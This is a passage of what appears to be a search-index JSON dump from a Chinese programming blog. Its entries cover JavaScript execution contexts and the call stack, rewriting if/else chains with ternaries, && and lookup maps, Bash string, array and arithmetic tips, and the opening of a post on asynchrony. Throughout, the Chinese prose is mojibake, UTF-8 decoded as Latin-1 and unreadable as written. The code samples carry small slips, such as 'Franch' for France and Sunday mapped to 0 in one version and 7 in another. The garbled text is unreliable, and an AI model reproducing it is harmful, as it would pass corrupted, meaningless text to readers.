æ¯å½“åˆ›å»ºä¸€ä¸ªæ–°çš„æ‰§è¡Œä¸Šä¸‹æ–‡æ—¶ï¼Œå®ƒå°±ä¼šè¢«å‹å…¥è¿™ä¸ªå †æ ˆï¼Œå¹¶åœ¨å®Œæˆå…¶ç›®çš„æ—¶è¢«å¼¹å‡ºã€‚ æ§ä»¶ä¸æ­¤è°ƒç”¨å †æ ˆçš„æœ€é¡¶éƒ¨å…ƒç´ ä¿æŒä¸€è‡´ã€‚ æ­¤è°ƒç”¨å †æ ˆä»…ç”¨äºç®¡ç†æ‰§è¡Œä¸Šä¸‹æ–‡ã€‚ åœ¨æˆåŠŸæ‰§è¡Œæœ€åä¸€æ¡è¯­å¥æ—¶ï¼Œè°ƒç”¨å †æ ˆè¢«æ¸…ç©ºã€‚ è°ƒç”¨å †æ ˆç»´æŠ¤æ‰§è¡Œä¸Šä¸‹æ–‡çš„*æ‰§è¡Œé¡ºåºã€‚*\nç»™ä¸ªå›¾æ›´å¥½ç†è§£ï¼š\nè°ƒç”¨å †æ ˆå…·æœ‰ä»¥ä¸‹èŠ±å“¨çš„åç§°ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¿™äº›åç§°æ¥å¼•ç”¨å®ƒï¼š\nExecution Context Stackï¼ˆæ‰§è¡Œä¸Šä¸‹æ–‡å †æ ˆï¼‰ Program Stackï¼ˆç¨‹åºæ ˆï¼‰ Control Stackï¼ˆæ§åˆ¶å †æ ˆï¼‰ Runtime Stackï¼ˆè¿è¡Œæ—¶å †æ ˆï¼‰ Machine Stackï¼ˆæœºå™¨å †æ ˆï¼‰ è¿™æ ·å¤§å®¶å°±ç†è§£äº†å§ï¼Œè¿™æ ·åé¢çš„å˜é‡æå‡ Hoisting å°±å¾ˆå¥½ç†è§£äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20220621-javascripts_how_to_run/","summary":"\u003ch3 id=\"javascript-åˆ°åº•æ˜¯å¦‚ä½•å·¥ä½œçš„\"\u003eJavaScript åˆ°åº•æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ\u003c/h3\u003e\n\u003ch4 id=\"ä¸€å·¥ä½œåŸç†\"\u003eä¸€ã€å·¥ä½œåŸç†\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003eJavaScriptåˆ°åº•æ˜¯ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cem\u003e\u003cstrong\u003eåŒæ­¥\u003c/strong\u003eè¿˜æ˜¯å¼‚æ­¥ï¼Ÿ\u003c/em\u003e\u003c/li\u003e\n\u003cli\u003e\u003cem\u003e\u003cstrong\u003eå•çº¿ç¨‹\u003c/strong\u003eè¿˜æ˜¯å¤šçº¿ç¨‹ï¼Ÿ\u003c/em\u003e\u003c/li\u003e\n\u003c/ul\u003e\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eJavaScript ä¸­çš„ä¸€åˆ‡éƒ½å‘ç”Ÿåœ¨\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eExecution Context\u003c/strong\u003e ï¼ˆæ‰§è¡Œä¸Šä¸‹æ–‡ï¼‰ä¸­\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eæ‚¨å¯ä»¥å‡è®¾è¿™ä¸ª\u003cem\u003eæ‰§è¡Œä¸Šä¸‹æ–‡\u003c/em\u003e æ˜¯ä¸€ä¸ªå¤§ç›’å­æˆ–ä¸€ä¸ªå®¹å™¨ï¼Œåœ¨å…¶ä¸­æ‰§è¡Œæ•´ä¸ª JavaScript ä»£ç ã€‚\u003c/li\u003e\n\u003cli\u003eè¿™ä¸ªå¤§ç›’å­é‡Œæœ‰ä¸¤ä¸ªç»„ä»¶ï¼š\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eMemoryï¼ˆå†…å­˜ç»„ä»¶ï¼‰ï¼š\u003cstrong\u003eè¿™æ˜¯æ‰€æœ‰å˜é‡å’Œå‡½æ•°å­˜å‚¨ä¸º\u003c/strong\u003eé”®å€¼å¯¹\u003c/strong\u003eçš„åœ°æ–¹ã€‚è¿™ä¸ª**â€œå†…å­˜ç»„ä»¶â€\u003cstrong\u003eä¹Ÿç§°ä¸º\u003c/strong\u003eå˜é‡ç¯å¢ƒ**ã€‚å› æ­¤ï¼Œå®ƒæ˜¯ä¸€ç§ç¯å¢ƒï¼Œå…¶ä¸­æ‰€æœ‰è¿™äº›å˜é‡å’Œå‡½æ•°éƒ½å­˜å‚¨ä¸ºé”®å€¼å¯¹ã€‚\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCodeï¼ˆä»£ç ç»„ä»¶ï¼‰ï¼š\u003cstrong\u003eè¿™æ˜¯ä»£ç é€è¡Œæ‰§è¡Œçš„åœ°æ–¹ã€‚è¿™ä¸ª\u003c/strong\u003eâ€œä»£ç ç»„ä»¶â€\u003cstrong\u003eä¹Ÿç§°ä¸º\u003c/strong\u003eæ‰§è¡Œçº¿ç¨‹\u003c/strong\u003eã€‚æ‰€ä»¥ï¼Œè¿™ä¸ª\u003cstrong\u003eæ‰§è¡Œçº¿ç¨‹\u003c/strong\u003eæ˜¯ä¸€ä¸ªå•çº¿ç¨‹ï¼Œæ•´ä¸ªä»£ç ä¸€æ¬¡åªæ‰§è¡Œä¸€è¡Œã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eç»“è®ºï¼šJavaScript æ˜¯ä¸€ç§\u003cem\u003eåŒæ­¥å•çº¿ç¨‹\u003c/em\u003eè¯­è¨€ã€‚\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eå•çº¿ç¨‹\u003c/strong\u003e æ„å‘³ç€ JavaScript ä¸€æ¬¡åªèƒ½æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ã€‚\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eåŒæ­¥å•çº¿ç¨‹\u003c/strong\u003e æ„å‘³ç€ JavaScript ä¸€æ¬¡åªèƒ½ä»¥ç‰¹å®šé¡ºåºæ¯æ¬¡æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ã€‚è¿™æ„å‘³ç€å®ƒåªèƒ½åœ¨å½“å‰è¡Œå®Œæˆæ‰§è¡Œåè½¬åˆ°ä¸‹ä¸€è¡Œã€‚è¿™å°±æ˜¯\u003cstrong\u003eåŒæ­¥å•çº¿ç¨‹\u003c/strong\u003eçš„æ„æ€ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eå¾ˆæƒŠè¯§å§ï¼Œå®é™… javascripts æœ‰å•çº¿ç¨‹ event loop å¤§å¾ªç¯æ¥å®Œæˆå¾ˆå¤šä¸å¯æ€è®®çš„äº‹æƒ…ã€‚\u003c/p\u003e\n\u003ch4 id=\"äºŒå®é™…å·¥ä½œè¿‡ç¨‹åˆ†æ\"\u003eäºŒã€å®é™…å·¥ä½œè¿‡ç¨‹åˆ†æ\u003c/h4\u003e\n\u003ch4 id=\"javascript-ä»£ç æ˜¯å¦‚ä½•æ‰§è¡Œçš„\"\u003eJavaScript ä»£ç æ˜¯å¦‚ä½•æ‰§è¡Œçš„ï¼Ÿ\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003eå½“ä½ è¿è¡Œ JavaScript ä»£ç æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eä¼šåˆ›å»ºä¸€ä¸ª\u003cstrong\u003eExecution Contextï¼ˆæ‰§è¡Œä¸Šä¸‹æ–‡ï¼‰\u003c/strong\u003eã€‚\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eè®©æˆ‘ä»¬ä½¿ç”¨å®é™…çš„ä»£ç æ¥ä¸¾ä¸ªä¾‹å­ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003evar n = 2;\nfunction square(num) {\n  var ans = num * num;\n  return ans;\n}\nvar square2 = square(n);\nvar square4 = square(4);\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eæ‰§è¡Œä¸Šè¿°ä»£ç æ—¶ï¼Œä¼šåˆ›å»º ä¸€ä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡\u003c/p\u003e","title":"JavaScript åˆ°åº•æ˜¯å¦‚ä½•æ‰§è¡Œçš„å‘¢ -- JSçš„ä½œåŸç†"},{"content":"Javascripts ä¸­çš„ if \u0026hellip; else ç”¨èµ·æ¥å€’æ˜¯å¾ˆæ–¹ä¾¿ï¼Œä½†æ˜¯çœ‹èµ·æ¥å°±ä¸èˆ’æœäº†\nif (true) { } if (true) { } if (true) { if (true) { if (true) { } } else { } } else { } ä¸Šé¢çœ‹èµ·æ¥å¾ˆé—¹å¿ƒå§ï¼Œä¸‹é¢è®²è®²ä¼˜åŒ–ï¼š\nä¸€ã€ä¸‰å…ƒä¼˜åŒ– if (ture) elseå¯ä»¥ç”¨ä¸‰å…ƒæ“ä½œç¬¦æ¥ä¼˜åŒ–å®ƒï¼š\n// Bad ğŸ˜¥ if (true) { console.log(\u0026#34;Congratutions!\u0026#34;) } else { console.warn(\u0026#34;Oops, something went wrong!\u0026#34;) } // Great ğŸ¥° true ? console.log(\u0026#34;Congratutions\u0026#34;) : console.warn(\u0026#34;Oops, something went wrong!\u0026#34;) äºŒã€ä¸ä¼˜åŒ– trueçš„æƒ…å†µä¸‹æ‰æ‰§è¡Œå¯ä»¥ç”¨ä¸æ¥è¿›è¡Œä¼˜åŒ–ï¼š\nif (true) { alert(1) } // is equals to: true \u0026amp;\u0026amp; alert(1) ä¸‰ã€æå‰è¿”å› å¦‚æœæœ‰å¤šä¸ªåˆ¤æ–­ï¼ŒæŒ‰ç…§å¤æ‚ç¨‹åº¦ï¼Œä»ä¸Šåˆ°ä¸‹ï¼Œæå‰è¿”å›ã€‚\nfunction handleRequest(req) { if (req.code \u0026gt;= 500) { return \u0026#34;Server error\u0026#34;; } if (req.code \u0026gt;= 404) { return \u0026#34;Cilent error\u0026#34;; } return \u0026#34;Suceess\u0026#34;; } å››ã€ç±»è¡¨æ ¼ä¼˜åŒ– ä¸‹é¢æ˜¯ç±»ä¼¼è¡¨æ ¼ä¼¼çš„é€‰æ‹©ï¼Œé€šå¸¸ä¼šç”¨ switch æ¥è¿›è¡Œä¼˜åŒ–\n// Bad ğŸ˜¥ const weekday = (num) =\u0026gt; { if (num === 1) { return \u0026#34;Monday\u0026#34; } else if (num === 2) { return \u0026#34;Tuesday\u0026#34; } else if (num === 3) { return \u0026#34;Wednesday\u0026#34; } else if (num === 4) { return \u0026#34;Thursday\u0026#34; } else if (num === 5) { return \u0026#34;Friday\u0026#34; } else if (num === 6) { return \u0026#34;Saturday\u0026#34; } else if (num === 7) { return \u0026#34;Sunday\u0026#34; } else { return \u0026#34;Unknown\u0026#34; } } console.log(weekday(1)) // Monday switch ä¹Ÿä¸æ˜¯æœ€ä¼˜è§£ï¼Œç”¨å¯¹è±¡çš„é”®å€¼å¯¹æ¥è§£ï¼š\nconst weekday = (option) =\u0026gt; { let obj = { 1: \u0026#34;Monday\u0026#34;, 2: \u0026#34;Tuesday\u0026#34;, 3: \u0026#34;Wednesday\u0026#34;, 4: \u0026#34;Thursday\u0026#34;, 5: \u0026#34;Friday\u0026#34;, 6: \u0026#34;Saturday\u0026#34;, 0: \u0026#34;Sunday\u0026#34; } return obj[option] ?? \u0026#34;Unknown\u0026#34; } console.log(weekday(1)) // Monday ä¹Ÿå¯ä»¥ç”¨ ES6 çš„ map æ¥å®ç°ï¼š\n// Great ğŸ¥° const weekday = (num) =\u0026gt; { const map = new Map() .set(1, \u0026#34;Monday\u0026#34;) .set(2, \u0026#34;Tuesday\u0026#34;) .set(3, \u0026#34;Wednesday\u0026#34;) .set(4, \u0026#34;Thursday\u0026#34;) .set(5, \u0026#34;Friday\u0026#34;) .set(6, \u0026#34;Saturday\u0026#34;) .set(7, \u0026#34;Sunday\u0026#34;); return map.has(num) ? map.get(num) : \u0026#34;Unknown\u0026#34;; }; console.log(weekday(1)); äº”ã€é€‰é¡¹å¤šå¯¹ä¸€çš„æ•°ç»„ä¼˜åŒ– çœ‹å¦‚ä¸‹ä»£ç ï¼Œå¤šä¸ªé€‰é¡¹å¯¹åº”ä¸€ä¸ªè¿”å›ï¼š\nconst getContinent = (option) =\u0026gt; { if (option === \u0026#34;China\u0026#34; || option === \u0026#34;Japan\u0026#34;) { return \u0026#34;Asia\u0026#34;; } if (option === \u0026#34;Germany\u0026#34; || option === \u0026#34;France\u0026#34;) { return \u0026#34;Europe\u0026#34;; } }; console.log(getContinent(\u0026#34;China\u0026#34;)); ä½¿ç”¨æ•°ç»„æ¥å®¹çº³å¤šä¸ªé€‰é¡¹ï¼Œç„¶åç”¨ includes æ¥åˆ¤æ–­å¹¶è¿”å›\nconst getContinent = (option) =\u0026gt; { const Asia = [\u0026#34;China\u0026#34;, \u0026#34;Japan\u0026#34;]; const Europe = [\u0026#34;Germany\u0026#34;, \u0026#34;Franch\u0026#34;]; if (Asia.includes(option)) return \u0026#34;Asia\u0026#34;; if (Europe.includes(option)) return \u0026#34;Europe\u0026#34;; return \u0026#34;Unknown\u0026#34;; }; console.log(getContinent(\u0026#34;China\u0026#34;)); // Asia è¿›ä¸€æ­¥ä¼˜åŒ–ï¼Œç”¨ \u0026amp;\u0026amp; ä¸ä¼˜åŒ–\nconst getContinent = (option) =\u0026gt; { let [result, setResult] = [\u0026#34;unknown\u0026#34;, (str) =\u0026gt; (result = str)]; const Asia = [\u0026#34;China\u0026#34;, \u0026#34;Japan\u0026#34;]; const Europe = [\u0026#34;Germany\u0026#34;, \u0026#34;Franch\u0026#34;]; Asia.includes(option) \u0026amp;\u0026amp; setResult(\u0026#34;Asia\u0026#34;); Europe.includes(option) \u0026amp;\u0026amp; setResult(\u0026#34;Europe\u0026#34;); return result; }; console.log(getContinent(\u0026#34;China\u0026#34;)); ","permalink":"https://rendoumi.com/posts/20220615-javascripts_if/","summary":"\u003cp\u003eJavascripts ä¸­çš„ if \u0026hellip; else ç”¨èµ·æ¥å€’æ˜¯å¾ˆæ–¹ä¾¿ï¼Œä½†æ˜¯çœ‹èµ·æ¥å°±ä¸èˆ’æœäº†\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode class=\"language-javascripts\" data-lang=\"javascripts\"\u003eif (true) {\n}\n\nif (true) {\n}\n\nif (true) {\n  if (true) {\n    if (true) {\n    }\n  } else {\n  }\n} else {\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eä¸Šé¢çœ‹èµ·æ¥å¾ˆé—¹å¿ƒå§ï¼Œä¸‹é¢è®²è®²ä¼˜åŒ–ï¼š\u003c/p\u003e\n\u003ch4 id=\"ä¸€ä¸‰å…ƒä¼˜åŒ–\"\u003eä¸€ã€ä¸‰å…ƒä¼˜åŒ–\u003c/h4\u003e\n\u003cp\u003eif (ture) elseå¯ä»¥ç”¨ä¸‰å…ƒæ“ä½œç¬¦æ¥ä¼˜åŒ–å®ƒï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Bad ğŸ˜¥\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Congratutions!\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewarn\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Oops, something went wrong!\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Great ğŸ¥°\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e?\u003c/span\u003e \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Congratutions\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewarn\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Oops, something went wrong!\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"äºŒä¸ä¼˜åŒ–\"\u003eäºŒã€ä¸ä¼˜åŒ–\u003c/h4\u003e\n\u003cp\u003etrueçš„æƒ…å†µä¸‹æ‰æ‰§è¡Œå¯ä»¥ç”¨ä¸æ¥è¿›è¡Œä¼˜åŒ–ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// is equals to:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"ä¸‰æå‰è¿”å›\"\u003eä¸‰ã€æå‰è¿”å›\u003c/h4\u003e\n\u003cp\u003eå¦‚æœæœ‰å¤šä¸ªåˆ¤æ–­ï¼ŒæŒ‰ç…§å¤æ‚ç¨‹åº¦ï¼Œä»ä¸Šåˆ°ä¸‹ï¼Œæå‰è¿”å›ã€‚\u003c/p\u003e","title":"Javascriptsä¸­ifçš„ä¼˜åŒ–"},{"content":"Shellè„šæœ¬çš„è¿›é˜¶æŠ€å·§ï¼š\nä¸€ã€String ç±»çš„æŠ€å·§ Stringç±»å½“ä½œæ•°ç»„æ¥ä½¿ç”¨ï¼Œæ³¨æ„èŒƒå›´çš„ä¸‹æ ‡ï¼Œ0:4ï¼Œ4æœ€åè¦è¢«è¸¢æ‰ï¼Œå®é™…æ˜¯0-3ï¼Œå…±4ä¸ªå­—ç¬¦ï¼š\nstring=\u0026#34;Bash is great!\u0026#34; echo ${string:8} # great! echo ${string:0:4} # Bash echo ${string:8:-1} # great (-1: upto 1st element from right) æ•°ç»„çš„é•¿åº¦ï¼š\nstring=\u0026#34;Bash is great!\u0026#34;; len=${#string} echo \u0026#34;len = $len\u0026#34; å­—ç¬¦ä¸²çš„æ›¿æ¢ï¼š\nstring=\u0026#34;Bash is great!!\u0026#34; echo ${string/Bash/GNU Bash} # GNU Bash is great!! echo ${string//!/.} # Bash is great.. å¤§å°å†™æ›¿æ¢:\nstring=\u0026#34;Bash\u0026#34; echo ${string^^} # BASH echo ${string,,} # bash æŒ‰indexå­˜å–æ•°ç»„ä¸­å­—ç¬¦åœ¨shellä¸­ä¸å¯ç”¨ï¼Œä½†æ˜¯å¯ä»¥ç”¨functionå˜ç›¸å®ç°ï¼š\nfunction charAt() { string=$1 i=$2 echo ${string:i:1} } echo $(charAt \u0026#34;Hello\u0026#34; 2) # l echo $(charAt \u0026#34;Hello\u0026#34; 1) # e äºŒã€æ•°ç»„å’Œå­—å…¸ å®šä¹‰ä¸€ä¸ªæ•°ç»„å¹¶ä¸”éå†å®ƒï¼š\nA=(2 4 5 6 4) for i in ${A[@]}; do echo -n \u0026#34;${i} \u0026#34; # 2 4 5 6 4 done åŒæ ·å¯¹æ•°ç»„è¿›è¡Œåˆ‡å‰²ï¼š\nA=(2 4 5 6 4) echo ${A[@]:2:3} # 5 6 4 echo ${A[@]:0:1} # 2 Bash ä¸­çš„æ•°ç»„éœ€è¦ä½¿ç”¨ [@] ç¬¦å·æ¥å¼•ç”¨æ•´ä¸ªæ•°ç»„ï¼Œå¯ä»¥ç”¨ç®€æ´çš„è¯­æ³•å¯¹æ•°ç»„å¢åŠ å…ƒç´ \nA=(1 2 3) A+=(4) echo ${A[@]} # 1 2 3 4 A+=(5 6) echo ${A[@]} # 1 2 3 4 5 6 å­—å…¸ä¹Ÿä¸€æ ·\ndeclare -A D D=([\u0026#34;one\u0026#34;]=1 [\u0026#34;two\u0026#34;]=2 [\u0026#34;three\u0026#34;]=3) for i in ${!D[@]}; do echo \u0026#34;$i -\u0026gt; ${D[$i]}\u0026#34; # one -\u0026gt; 1 .... done ä¸‰ã€æ•°å­¦è®¡ç®— ç®€å•çš„æ•°å­¦è®¡ç®—å¯ä»¥ç”¨ $((...)) æ¥å®Œæˆï¼š\na=10 b=5 echo \u0026#34;$a + $b = $((a + b))\u0026#34; # 10 + 5 = 15 echo \u0026#34;$a - $b = $((a - b))\u0026#34; # 10 - 5 = 5 echo \u0026#34;$a x $b = $((a * b))\u0026#34; # 10 x 5 = 50 echo \u0026#34;$a / $b = $((a / b))\u0026#34; # 10 / 5 = 2 echo \u0026#34;$a % $b = $((a % b))\u0026#34; # 10 % 5 = 0 æˆ–è€…å€ŸåŠ©å¤æ‚ä¸€ç‚¹çš„ bc æ¥å®Œæˆï¼š\na=10 b=5.7 echo \u0026#34;$a / $b = $(echo \u0026#34;scale = 2; $a / $b\u0026#34; | bc)\u0026#34; # 10 / 5.7 = 1.75 éšæœºæ•°çš„äº§ç”Ÿï¼š\necho $(($RANDOM % 10)) # Random number between 0 and 10 å››ã€è¾“å…¥ æ§åˆ¶è¾“å…¥å˜é‡ï¼š\nread -p \u0026#34;Enter your name: \u0026#34; name echo \u0026#34;Hello, $name\u0026#34; å¦‚æœè¦è¾“å…¥æ•°ç»„ï¼š\nread -p \u0026#34;Enter numbers: \u0026#34; -a A echo ${A[@]} å€ŸåŠ©ä¸Šé¢çš„æŠ€å·§ï¼Œæˆ‘ä»¬å¯ä»¥å†™å‡ºä¸€äº›å¤æ‚çš„ shell è„šæœ¬äº†\n","permalink":"https://rendoumi.com/posts/20220609-shell_tips/","summary":"\u003cp\u003eShellè„šæœ¬çš„è¿›é˜¶æŠ€å·§ï¼š\u003c/p\u003e\n\u003ch4 id=\"ä¸€string-ç±»çš„æŠ€å·§\"\u003eä¸€ã€String ç±»çš„æŠ€å·§\u003c/h4\u003e\n\u003cp\u003eStringç±»å½“ä½œæ•°ç»„æ¥ä½¿ç”¨ï¼Œæ³¨æ„èŒƒå›´çš„ä¸‹æ ‡ï¼Œ0:4ï¼Œ4æœ€åè¦è¢«è¸¢æ‰ï¼Œå®é™…æ˜¯0-3ï¼Œå…±4ä¸ªå­—ç¬¦ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003estring=\u0026#34;Bash is great!\u0026#34;\n\necho ${string:8} # great!\necho ${string:0:4} # Bash\necho ${string:8:-1} # great (-1: upto 1st element from right)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eæ•°ç»„çš„é•¿åº¦ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003estring=\u0026#34;Bash is great!\u0026#34;;\nlen=${#string}\necho \u0026#34;len = $len\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eå­—ç¬¦ä¸²çš„æ›¿æ¢ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003estring=\u0026#34;Bash is great!!\u0026#34;\necho ${string/Bash/GNU Bash} # GNU Bash is great!!\necho ${string//!/.} # Bash is great..\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eå¤§å°å†™æ›¿æ¢:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003estring=\u0026#34;Bash\u0026#34;\necho ${string^^} # BASH\necho ${string,,} # bash\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eæŒ‰indexå­˜å–æ•°ç»„ä¸­å­—ç¬¦åœ¨shellä¸­ä¸å¯ç”¨ï¼Œä½†æ˜¯å¯ä»¥ç”¨functionå˜ç›¸å®ç°ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003efunction charAt() {\n    string=$1\n    i=$2\n    echo ${string:i:1}\n}\necho $(charAt \u0026#34;Hello\u0026#34; 2) # l\necho $(charAt \u0026#34;Hello\u0026#34; 1) # e\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 id=\"äºŒæ•°ç»„å’Œå­—å…¸\"\u003eäºŒã€æ•°ç»„å’Œå­—å…¸\u003c/h4\u003e\n\u003cp\u003eå®šä¹‰ä¸€ä¸ªæ•°ç»„å¹¶ä¸”éå†å®ƒï¼š\u003c/p\u003e","title":"Shellè¿›é˜¶æŠ€å·§"},{"content":"ä¸€ã€åŸºæœ¬æ¦‚å¿µ\n1. å¼‚æ­¥\næ‰€è°“ \u0026quot; å¼‚æ­¥ \u0026ldquo;ï¼Œç®€å•è¯´å°±æ˜¯ä¸€ä¸ªä»»åŠ¡åˆ†æˆä¸¤æ®µï¼Œ å…ˆæ‰§è¡Œç¬¬ä¸€æ®µï¼Œ ç„¶åè½¬è€Œæ‰§è¡Œå…¶ä»–ä»»åŠ¡å»ï¼Œ ç­‰åšå¥½äº†å‡†å¤‡ï¼Œ å†å›è¿‡å¤´æ‰§è¡Œç¬¬äºŒæ®µã€‚\næ¯”å¦‚ï¼Œ 